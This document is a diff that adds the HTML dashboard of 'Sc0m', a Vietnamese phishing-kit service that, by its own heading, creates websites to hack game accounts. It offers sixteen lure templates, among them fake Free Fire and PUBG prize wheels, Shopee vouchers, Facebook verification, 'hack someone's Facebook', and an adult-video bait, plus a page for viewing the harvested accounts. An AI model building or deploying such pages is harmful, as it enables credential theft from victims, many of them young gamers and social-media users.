@@ -1,0 +1,328 @@
+
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+	<meta charset="utf-8" />
+	<title> Dashboard | Share code sc0m acc miễn phí</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1" />
+	<meta name="description" content="" />
+	<meta name="author" content="" />
+	
+	<!-- ================== BEGIN core-css ================== -->
+	<link href="assets/css/vendor.min.css" rel="stylesheet" />
+	<link href="assets/css/app.min.css" rel="stylesheet" />
+	<!-- ================== END core-css ================== -->
+	<script src=""></script>
+	<script type='text/javascript'>
+//<![CDATA[
+function loadCSS(e, t, n) { "use strict"; var i = window.document.createElement("link"); var o = t || window.document.getElementsByTagName("script")[0]; i.rel = "stylesheet"; i.href = e; i.media = "only x"; o.parentNode.insertBefore(i, o); setTimeout(function () { i.media = n || "all" }) }
+loadCSS("");loadCSS("");
+//]]>
+</script>
+<style>
+    body{font-family:"Roboto",sans-serif;font-size:16px}
+</style>
+</head>
+<body>
+   
+	<!-- BEGIN #app -->
+	<div id="app" class="app">
+		<!-- BEGIN #header -->
+		<div id="header" class="app-header">
+			<!-- BEGIN desktop-toggler -->
+			<div class="desktop-toggler">
+				<button type="button" class="menu-toggler" data-toggle-class="app-sidebar-collapsed" data-dismiss-class="app-sidebar-toggled" data-toggle-target=".app">
+					<span class="bar"></span>
+					<span class="bar"></span>
+					<span class="bar"></span>
+				</button>
+			</div>
+			<!-- BEGIN desktop-toggler -->
+			
+			<!-- BEGIN mobile-toggler -->
+			<div class="mobile-toggler">
+				<button type="button" class="menu-toggler" data-toggle-class="app-sidebar-mobile-toggled" data-toggle-target=".app">
+					<span class="bar"></span>
+					<span class="bar"></span>
+					<span class="bar"></span>
+				</button>
+			</div>
+			<!-- END mobile-toggler -->
+			
+			<!-- BEGIN brand -->
+			<div class="brand">
+				<a href="#" class="brand-logo">
+					<span class="brand-img">
+						<span class="brand-img-text text-theme">V</span>
+					</span>
+					<span class="brand-text">Sc0m</span>
+				</a>
+			</div>
+			<!-- END brand -->
+			
+			<!-- BEGIN menu -->
+			<div class="menu">
+				<div class="menu-item dropdown">
+					<a href="#" data-toggle-class="app-header-menu-search-toggled" data-toggle-target=".app" class="menu-link">
+						<div class="menu-icon"><i class="bi bi-search nav-icon"></i></div>
+					</a>
+				</div>
+				<div class="menu-item dropdown dropdown-mobile-full">
+					<a href="#" data-bs-toggle="dropdown" data-bs-display="static" class="menu-link">
+						<div class="menu-icon"><i class="bi bi-grid-3x3-gap nav-icon"></i></div>
+					</a>
+					<div class="dropdown-menu fade dropdown-menu-end w-300px text-center p-0 mt-1">
+						<div class="row row-grid gx-0">
+							<div class="col-4">
+								<a href="#" class="dropdown-item text-decoration-none p-3 bg-none">
+									<div class="position-relative">
+										<i class="bi bi-circle-fill position-absolute text-theme top-0 mt-n2 me-n2 fs-6px d-block text-center w-100"></i>
+										<i class="bi bi-envelope h2 opacity-5 d-block my-1"></i>
+									</div>
+									<div class="fw-500 fs-10px text-white">INBOX</div>
+								</a>
+							</div>
+							<div class="col-4">
+								<a href="#" class="dropdown-item text-decoration-none p-3 bg-none">
+									<div><i class="bi bi-hdd-network h2 opacity-5 d-block my-1"></i></div>
+									<div class="fw-500 fs-10px text-white">DISK DRIVE</div>
+								</a>
+							</div>
+							<div class="col-4">
+								<a href="#" class="dropdown-item text-decoration-none p-3 bg-none">
+									<div><i class="bi bi-calendar4 h2 opacity-5 d-block my-1"></i></div>
+									<div class="fw-500 fs-10px text-white">CALENDAR</div>
+								</a>
+							</div>
+						</div>
+						<div class="row row-grid gx-0">
+							<div class="col-4">
+								<a href="#" class="dropdown-item text-decoration-none p-3 bg-none">
+									<div><i class="bi bi-terminal h2 opacity-5 d-block my-1"></i></div>
+									<div class="fw-500 fs-10px text-white">TERMINAL</div>
+								</a>
+							</div>
+							<div class="col-4">
+								<a href="#" class="dropdown-item text-decoration-none p-3 bg-none">
+									<div class="position-relative">
+										<i class="bi bi-circle-fill position-absolute text-theme top-0 mt-n2 me-n2 fs-6px d-block text-center w-100"></i>
+										<i class="bi bi-sliders h2 opacity-5 d-block my-1"></i>
+									</div>
+									<div class="fw-500 fs-10px text-white">SETTINGS</div>
+								</a>
+							</div>
+							<div class="col-4">
+								<a href="#" class="dropdown-item text-decoration-none p-3 bg-none">
+									<div><i class="bi bi-collection-play h2 opacity-5 d-block my-1"></i></div>
+									<div class="fw-500 fs-10px text-white">LIBRARY</div>
+								</a>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div class="menu-item dropdown dropdown-mobile-full">
+					<a href="#" data-bs-toggle="dropdown" data-bs-display="static" class="menu-link">
+						<div class="menu-icon"><i class="bi bi-bell nav-icon"></i></div>
+						<div class="menu-badge bg-theme"></div>
+					</a>
+					<div class="dropdown-menu dropdown-menu-end mt-1 w-300px fs-11px pt-1">
+						<h6 class="dropdown-header fs-10px mb-1">NOTIFICATIONS</h6>
+						<div class="d-flex align-items-center py-10px dropdown-item text-wrap fs-6 bg-white bg-opacity-15 text-white text-opacity-50 h-100px">
+							No record found
+						</div>
+						<hr class="bg-white-transparent-5 mb-0 mt-0" />
+						<div class="py-10px mb-n2 text-center">
+							<a href="#" class="text-decoration-none fw-bold">SEE ALL</a>
+						</div>
+					</div>
+				</div>
+				<div class="menu-item dropdown dropdown-mobile-full">
+					<a href="#" data-bs-toggle="dropdown" data-bs-display="static" class="menu-link">
+						<div class="menu-img online">
+							<div class="d-flex align-items-center justify-content-center w-100 h-100 bg-white bg-opacity-25 text-white text-opacity-50 rounded-circle overflow-hidden">
+								<i class="bi bi-person-fill fs-32px mb-n3"></i>
+							</div>
+						</div>
+						<div class="menu-text d-sm-block d-none">TCuong</div>
+					</a>
+					<div class="dropdown-menu dropdown-menu-end me-lg-3 fs-11px mt-1">
+						<a class="dropdown-item d-flex align-items-center" href="#">PROFILE <i class="bi bi-person-circle ms-auto text-theme fs-16px my-n1"></i></a>
+						<a class="dropdown-item d-flex align-items-center" href="#">INBOX <i class="bi bi-envelope ms-auto text-theme fs-16px my-n1"></i></a>
+						<a class="dropdown-item d-flex align-items-center" href="#">CALENDAR <i class="bi bi-calendar ms-auto text-theme fs-16px my-n1"></i></a>
+						<a class="dropdown-item d-flex align-items-center" href="#">SETTINGS <i class="bi bi-gear ms-auto text-theme fs-16px my-n1"></i></a>
+						<div class="dropdown-divider"></div>
+						<a class="dropdown-item d-flex align-items-center" href="#">LOGOUT <i class="bi bi-toggle-off ms-auto text-theme fs-16px my-n1"></i></a>
+					</div>
+				</div>
+			</div>
+			<!-- END menu -->
+			
+			<!-- BEGIN menu-search -->
+			<form class="menu-search" method="POST" name="header_search_form">
+				<div class="menu-search-container">
+					<div class="menu-search-icon"><i class="bi bi-search"></i></div>
+					<div class="menu-search-input">
+						<input type="text" class="form-control form-control-lg" placeholder="Search menu..." />
+					</div>
+					<div class="menu-search-icon">
+						<a href="#" data-toggle-class="app-header-menu-search-toggled" data-toggle-target=".app"><i class="bi bi-x-lg"></i></a>
+					</div>
+				</div>
+			</form>
+			<!-- END menu-search -->
+		</div>
+		<!-- END #header -->
+		
+		<!-- BEGIN #sidebar -->
+		<div id="sidebar" class="app-sidebar">
+			<!-- BEGIN scrollbar -->
+			<div class="app-sidebar-content" data-scrollbar="true" data-height="100%">
+				<!-- BEGIN menu -->
+				<div class="menu">
+					<div class="menu-header">Navigation</div>
+					<div class="menu-item active">
+						<a href="index.html" class="menu-link">
+							<span class="menu-icon"><i class="bi bi-house-door"></i></span>
+							<span class="menu-text">Home</span>
+						</a>
+					</div>
+				</div>
+				<!-- END menu -->
+			</div>
+			<!-- END scrollbar -->
+		</div>
+		<!-- END #sidebar -->
+			
+		<!-- BEGIN mobile-sidebar-backdrop -->
+		<button class="app-sidebar-mobile-backdrop" data-toggle-target=".app" data-toggle-class="app-sidebar-mobile-toggled"></button>
+		<!-- END mobile-sidebar-backdrop -->
+		
+		<!-- BEGIN #content -->
+		<div id="content" class="app-content">
+			<ul class="breadcrumb">
+				<li class="breadcrumb-item"><a href="#">BREADCRUMB</a></li>
+				<li class="breadcrumb-item active">HOME PAGE</li>
+			</ul>
+			
+			<h1 class="page-header">
+				Sc0m <small>Tạo website hack nick game miễn phí</small>
+			</h1>
+			
+			<p>
+				Chúng tôi sẽ không can thiệp vào dữ liệu của bạn.
+			</p>
+			<div class="row">
+			  <center class="mb-2">
+			       <a href="make.php"><button class="btn btn-success">Tạo website</button></a>
+			      <a href="websites.php"><button class="btn btn-primary">Xem tài khoản</button></a>
+			      <a href="https://docs.google.com/document/d/1DItrxbfmjd2QiCYZbBOzdkopysCGSGbXm9uMzHkpg-8/edit?usp=sharing"><button class="btn btn-warning">Hướng dẫn kiếm nhiều tài khoản</button></a>
+			      <a href="logout.php"><button class="btn btn-danger">Đăng xuất</button></a>
+			  </center>
+			    <!-- BEGIN col-6 -->
+
+  <div class="col-md-12 mt-2">
+			       <div class="row justify-content-center row-cols-1 row-cols-sm-2 row-cols-lg-4 row-cols-xl-4 row-cols-xxl-12 g-2 mb-3 text-center">
+	     <div class="col"><img style="height:250px;object-fit:cover" class="w-100 rounded  d-block" src="demo/theme16.jpg"/>
+	        <div>
+	            <b class="mt-2 d-block">Nhận quà Free Fire fake Tiktok</b>
+	            <button onclick="window.location.href='make-step-2.php?id=16'" type="button" class="btn btn-outline-theme btn-sm mt-2">Tạo</button>
+	        </div></div><div class="col"><img style="height:250px;object-fit:cover" class="w-100 rounded  d-block" src="demo/theme15.jpg"/>
+	        <div>
+	            <b class="mt-2 d-block">Vòng quay mãn xà Free Fire</b>
+	            <button onclick="window.location.href='make-step-2.php?id=15'" type="button" class="btn btn-outline-theme btn-sm mt-2">Tạo</button>
+	        </div></div><div class="col"><img style="height:250px;object-fit:cover" class="w-100 rounded  d-block" src="demo/theme14.jpg"/>
+	        <div>
+	            <b class="mt-2 d-block">VÒNG QUAY MAY MẮN WARRIOR x PUBG MOBILE</b>
+	            <button onclick="window.location.href='make-step-2.php?id=14'" type="button" class="btn btn-outline-theme btn-sm mt-2">Tạo</button>
+	        </div></div><div class="col"><img style="height:250px;object-fit:cover" class="w-100 rounded  d-block" src="demo/theme13.jpg"/>
+	        <div>
+	            <b class="mt-2 d-block">Vòng quay Free Fire Quỷ Dạ Xoa</b>
+	            <button onclick="window.location.href='make-step-2.php?id=13'" type="button" class="btn btn-outline-theme btn-sm mt-2">Tạo</button>
+	        </div></div><div class="col"><img style="height:250px;object-fit:cover" class="w-100 rounded  d-block" src="demo/theme12.jpg"/>
+	        <div>
+	            <b class="mt-2 d-block">Nhận quà Free Fire mới</b>
+	            <button onclick="window.location.href='make-step-2.php?id=12'" type="button" class="btn btn-outline-theme btn-sm mt-2">Tạo</button>
+	        </div></div><div class="col"><img style="height:250px;object-fit:cover" class="w-100 rounded  d-block" src="demo/theme11.jpg"/>
+	        <div>
+	            <b class="mt-2 d-block">Video 18+ Sex 1</b>
+	            <button onclick="window.location.href='make-step-2.php?id=11'" type="button" class="btn btn-outline-theme btn-sm mt-2">Tạo</button>
+	        </div></div><div class="col"><img style="height:250px;object-fit:cover" class="w-100 rounded  d-block" src="demo/theme10.jpg"/>
+	        <div>
+	            <b class="mt-2 d-block">Nhận đề ôn thi THPT Quốc Gia</b>
+	            <button onclick="window.location.href='make-step-2.php?id=10'" type="button" class="btn btn-outline-theme btn-sm mt-2">Tạo</button>
+	        </div></div><div class="col"><img style="height:250px;object-fit:cover" class="w-100 rounded  d-block" src="demo/theme9.jpg"/>
+	        <div>
+	            <b class="mt-2 d-block">Nhận voucher Shopee 1</b>
+	            <button onclick="window.location.href='make-step-2.php?id=9'" type="button" class="btn btn-outline-theme btn-sm mt-2">Tạo</button>
+	        </div></div><div class="col"><img style="height:250px;object-fit:cover" class="w-100 rounded  d-block" src="demo/theme8.jpg"/>
+	        <div>
+	            <b class="mt-2 d-block">Hack/Report/Dame tài khoản Facebook của người khác</b>
+	            <button onclick="window.location.href='make-step-2.php?id=8'" type="button" class="btn btn-outline-theme btn-sm mt-2">Tạo</button>
+	        </div></div><div class="col"><img style="height:250px;object-fit:cover" class="w-100 rounded  d-block" src="demo/theme7.jpg"/>
+	        <div>
+	            <b class="mt-2 d-block">Xác minh tích xanh Facebook</b>
+	            <button onclick="window.location.href='make-step-2.php?id=7'" type="button" class="btn btn-outline-theme btn-sm mt-2">Tạo</button>
+	        </div></div><div class="col"><img style="height:250px;object-fit:cover" class="w-100 rounded  d-block" src="demo/theme6.jpg"/>
+	        <div>
+	            <b class="mt-2 d-block">Khôi phục tin nhắn Facebook Messenger đã xóa</b>
+	            <button onclick="window.location.href='make-step-2.php?id=6'" type="button" class="btn btn-outline-theme btn-sm mt-2">Tạo</button>
+	        </div></div><div class="col"><img style="height:250px;object-fit:cover" class="w-100 rounded  d-block" src="demo/theme5.jpg"/>
+	        <div>
+	            <b class="mt-2 d-block">Bói tình yêu theo tên</b>
+	            <button onclick="window.location.href='make-step-2.php?id=5'" type="button" class="btn btn-outline-theme btn-sm mt-2">Tạo</button>
+	        </div></div><div class="col"><img style="height:250px;object-fit:cover" class="w-100 rounded  d-block" src="demo/theme4.jpg"/>
+	        <div>
+	            <b class="mt-2 d-block">Bình chọn gái xinh 1</b>
+	            <button onclick="window.location.href='make-step-2.php?id=4'" type="button" class="btn btn-outline-theme btn-sm mt-2">Tạo</button>
+	        </div></div><div class="col"><img style="height:250px;object-fit:cover" class="w-100 rounded  d-block" src="demo/theme3.jpg"/>
+	        <div>
+	            <b class="mt-2 d-block">Nhận quà Liên Quân Mobile 1</b>
+	            <button onclick="window.location.href='make-step-2.php?id=3'" type="button" class="btn btn-outline-theme btn-sm mt-2">Tạo</button>
+	        </div></div><div class="col"><img style="height:250px;object-fit:cover" class="w-100 rounded  d-block" src="demo/theme2.jpg"/>
+	        <div>
+	            <b class="mt-2 d-block">Hòm quà Free Fire</b>
+	            <button onclick="window.location.href='make-step-2.php?id=2'" type="button" class="btn btn-outline-theme btn-sm mt-2">Tạo</button>
+	        </div></div><div class="col"><img style="height:250px;object-fit:cover" class="w-100 rounded  d-block" src="demo/theme1.jpg"/>
+	        <div>
+	            <b class="mt-2 d-block">Garena Free Fire Membership</b>
+	            <button onclick="window.location.href='make-step-2.php?id=1'" type="button" class="btn btn-outline-theme btn-sm mt-2">Tạo</button>
+	        </div></div>
+	    </div>
+	    
+			    </div>
+<!-- END col-6 -->
+			</div>
+		</div>
+		<!-- END #content -->
+		
+		<!-- BEGIN btn-scroll-top -->
+		<a href="#" data-toggle="scroll-to-top" class="btn-scroll-top fade"><i class="fa fa-arrow-up"></i></a>
+		<!-- END btn-scroll-top -->
+		
+	</div>
+
+
+	<!-- ================== BEGIN core-js ================== -->
+	<script src="assets/js/vendor.min.js"></script>
+	<script src="assets/js/app.min.js"></script>
+
+	<!-- ================== END core-js ================== -->
+	<script>
+
+	    var clipboard = new ClipboardJS('.copylink');
+
+clipboard.on('success', function(e) {
+   
+    alert('Đã sao chép vào bộ nhớ đệm!');
+
+    e.clearSelection();
+});
+
+clipboard.on('error', function(e) {
+    console.error('Action:', e.action);
+    console.error('Trigger:', e.trigger);
+});
+	</script>
+	
+</body>
+</html>
